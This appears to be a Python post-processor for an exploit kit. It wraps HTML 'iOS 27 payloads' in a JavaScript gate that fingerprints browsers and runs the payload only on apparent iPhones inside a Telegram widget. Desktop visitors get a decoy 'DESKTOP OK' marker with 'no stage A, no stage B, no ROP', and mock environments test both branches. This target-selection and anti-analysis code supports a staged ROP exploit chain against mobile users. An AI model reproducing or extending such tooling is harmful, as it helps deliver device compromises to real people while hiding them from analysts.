#!/usr/bin/env python3
"""Desktop gate for the iOS 27 payloads (post-processor, host-only).

Wraps the single script of each payload in `if(!GD){(function(){"use strict";
<body>})()}` so the original strict-mode body is preserved, prepends the gate,
and adds a desktop branch:
  detector -> P3 platform=9 report (host maps "desktop, no final")
  final    -> "DESKTOP OK" marker, no stage A, no stage B, no ROP
Gated copies go to ios27_gated/ (originals untouched).
"""
import hashlib, os, re, zlib

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.join(HERE, "ios27")
OUT = os.path.join(HERE, "ios27_gated")

GATE = ("var GD=1;var N=navigator,U=''+N.userAgent,C=(TelegramWidget&&TelegramWidget.contentSafeAreaInset)||{},"
        "S=(screen&&screen.width)||0;if(U.length<40&&U.indexOf('TelegramWidget')>=0&&"
        "typeof __twReceive=='undefined'&&typeof __hostOps=='undefined'&&typeof webkit=='undefined'&&S<=800&&"
        "((C.bottom||0)+(C.cornerLeft||0)+(C.cornerRight||0)>0||(devicePixelRatio||1)>=2))GD=0;")

DESK_REPORT = r'''if(GD){!function(){var s='P3',B=[],i;function P(v,w){for(var j=w-1;j>=0;j--)B.push(v>>8*j&255)}P(3,1);P(9,1);P(0,1);P(0,1);P(255,1);P(0,2);P(0,2);P(0,2);P(0,1);P(0,1);P(0,2);P(0,2);P(63,1);P(63,1);P(128,1);P(0,2);P(0,2);P(0,1);P(0,1);P(0,1);P(0,3);for(i=0;i<B.length;i++)s+=('0'+B[i].toString(16)).slice(-2);try{var d=document.getElementById('v');if(d)d.textContent='DESKTOP OK R='+s}catch(e){}try{if(typeof TelegramWidget!='undefined'&&TelegramWidget.request){var p=TelegramWidget.request(s);if(p&&p.then)p.then(function(){},function(){})}}catch(e){}}();}'''

DESK_MARK = "if(GD){try{var d=document.getElementById('v');if(d)d.textContent='DESKTOP OK'}catch(e){}}"

ENV_MOBILE = ('var navigator={userAgent:"Mozilla/5.0 TelegramWidget/1.0",platform:"TelegramWidget"};'
              'var screen={width:390,height:844};var devicePixelRatio=3;'
              'var TelegramWidget={contentSafeAreaInset:{bottom:34,cornerLeft:0,cornerRight:0},'
              'request:function(d){globalThis.REP=d;return new Promise(function(r){'
              'r(Object.freeze({result:"K"}))})}};')
ENV_DESKTOP = ('var navigator={userAgent:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
               'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",platform:"Win32"};'
               'var screen={width:1920,height:1080};var devicePixelRatio=1;'
               'var TelegramWidget={contentSafeAreaInset:{bottom:0,cornerLeft:0,cornerRight:0},'
               'request:function(d){globalThis.REP=d;return new Promise(function(r){'
               'r(Object.freeze({result:"K"}))})}};')


def gate_page(src, desk_tail):
    m = re.search(r'<script([^>]*)>(.*?)</script>', src, re.S)
    body = m.group(2)
    nb = GATE + 'if(!GD){(function(){"use strict";' + body + '})()};' + desk_tail
    return src[:m.start(2)] + nb + src[m.end(2):]


def main():
    os.makedirs(OUT, exist_ok=True)
    names = ["detector_ios27.html", "final_ios27.html", "final_ios27_timed.html",
             "final_ios27_timed_miss.html"]
    names += ["final_ios27_m%d.html" % m for m in
              (0, 128, 256, 384, 512, 640, 768, 896, 1024, 1280, 1536, 1792, 2048, 2560, 3072)]
    out = {}
    for n in names:
        s = open(os.path.join(SRC, n), encoding="utf-8").read()
        tail = DESK_REPORT if n.startswith("detector") else DESK_MARK
        g = gate_page(s, tail)
        open(os.path.join(OUT, n), "w").write(g)
        out[n] = {"raw": len(g.encode()), "zlib9": len(zlib.compress(g.encode(), 9)),
                  "sha256": hashlib.sha256(g.encode()).hexdigest()}
    # host mocks: env in front of the gated detector and the m768 final
    for tag, env in (("m", ENV_MOBILE), ("m_desk", ENV_DESKTOP)):
        for base, n in (("det", "detector_ios27.html"), ("fin", "final_ios27_m768.html")):
            s = open(os.path.join(OUT, n), encoding="utf-8").read()
            p = s.replace('<script', '<script id="env0">' + env + '</script><script', 1)
            open(os.path.join(OUT, "%s_%s.html" % (tag, base)), "w").write(p)
    import json
    print(json.dumps(out, indent=1))


if __name__ == "__main__":
    main()
